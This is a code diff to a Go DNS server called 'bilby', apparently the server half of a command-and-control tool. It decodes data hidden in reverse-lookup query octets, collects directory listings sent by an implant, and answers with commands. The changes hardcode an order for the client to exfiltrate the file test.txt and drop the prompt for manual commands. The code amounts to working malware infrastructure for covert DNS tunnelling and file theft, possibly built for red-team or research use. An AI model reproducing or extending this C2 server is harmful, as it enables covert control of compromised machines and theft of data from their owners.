@@ -19,7 +19,10 @@ var ls_bytes []byte
 func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) string {
 	var bytes []byte
 	var c2_command string = ""
-	c2_mappings := map[string]string{"hbt": "", "cmd": ""}
+
+	// Specify what the client should do on the next connection to this server
+	// This example specifies that the client should exfiltrate (exf) the file test.txt to the server.
+	c2_mappings := map[string]string{"hbt": "cmd.exf.test.txt"}
 
 	// If the first octet is equal to "172" or "185", the operation is setting the current baseline. Otherwise, decode the data using the baseline.
 	if octets[0] == "172" || octets[0] == "185" {
@@ -62,14 +65,13 @@ func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) str
 			if *c && command != "els" && command != "bls" {
 				// While collecting, continue appending all received bytes to the ls byte slice instead of interpreting them as commands
 				*lsb = append((*lsb), []byte(command)...)
+			} else {
+				if command != "bls" && command != "els" {
+					fmt.Printf("Command: %v\n", command)
+				}
 			}
 
-			if command == "cmd" {
-				var target string
-				fmt.Print("Received request for a command. Enter now: ")
-				fmt.Scan(&target)
-				c2_command = "cmd." + target
-			} else if command == "bls" {
+			if command == "bls" {
 				// Begin collecting the output bytes of the ls command
 				*c = true
 			} else if command == "els" {
@@ -79,6 +81,7 @@ func decodeAddress(octets []string, b *int, m *string, c *bool, lsb *[]byte) str
 				*c = false
 			} else {
 				c2_command = c2_mappings[command]
+
 			}
 		}
 	}
@@ -95,7 +98,7 @@ func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
 	if err != nil {
 		panic(err)
 	}
-	word := g.Word()
+	word := g.Word() 
 
 	// Retrieve the octets being sent over.
 	var ipv4 []string = strings.Split(r.Question[0].Name, ".in-addr.arpa.")
@@ -124,12 +127,11 @@ func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
 }
 
 func main() {
-	// https://dev.to/jones_charles_ad50858dbc0/building-dns-resolution-and-domain-services-with-go-a-practical-guide-5d87
 
 	// Start up the server to communicate with the client
 	dns.HandleFunc(".", handleRequest)
 	server := &dns.Server{Addr: ":8053", Net: "udp"}
-	fmt.Println("[!] bilby server running on :8053")
+	fmt.Println("Bilby Server running on :8053")
 	if err := server.ListenAndServe(); err != nil {
 		log.Fatalf("Server failed: %v", err)
 	}
